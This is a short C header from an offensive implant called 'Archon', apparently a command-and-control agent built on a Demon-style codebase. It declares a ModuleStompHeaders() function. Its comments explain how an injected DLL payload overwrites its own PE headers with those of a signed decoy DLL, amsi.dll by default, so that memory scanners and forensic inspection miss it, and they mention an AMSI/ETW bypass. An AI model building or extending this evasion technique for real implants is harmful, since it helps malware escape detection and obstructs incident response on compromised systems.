#ifndef ARCHON_MODULE_STOMP_H
#define ARCHON_MODULE_STOMP_H

#include <windows.h>
#include <ntstatus.h>

/*!
 * ARC-05: Module stomping for injected DLL payload.
 *
 * When Archon is loaded as a DLL (reflective injection, rundll32, etc.) its
 * MZ/PE headers remain in the module's first page and are a reliable artefact
 * for memory scanners.  ModuleStompHeaders() overwrites those headers with
 * the headers of a legitimate, signed Windows DLL so the memory region looks
 * benign to both automated scanners and manual forensic inspection.
 *
 * The decoy DLL is loaded via LdrModuleLoad (amsi.dll by default — it is
 * small, present on all modern Windows, and already loaded by the AMSI/ETW
 * bypass path).  Only the first page (PAGE_SIZE bytes, typically 0x1000) is
 * copied — this covers the DOS header, PE signature, COFF header, optional
 * header, and section table.
 *
 * Both x64 and x86 builds are supported; the implementation is architecture-
 * agnostic (no arch-specific stubs required).
 *
 * Call site: Demon.c, after DemonInit() sets Instance->Session.ModuleBase.
 */

/*!
 * Overwrite the PE headers of Archon's own loaded DLL module with headers
 * read from a legitimate decoy DLL.
 *
 * @return STATUS_SUCCESS on success.
 *         STATUS_INVALID_PARAMETER if ModuleBase is NULL.
 *         STATUS_NOT_FOUND if the decoy DLL could not be loaded.
 *         An NTSTATUS error from NtProtectVirtualMemory on failure.
 */
NTSTATUS ModuleStompHeaders( VOID );

#endif /* ARCHON_MODULE_STOMP_H */
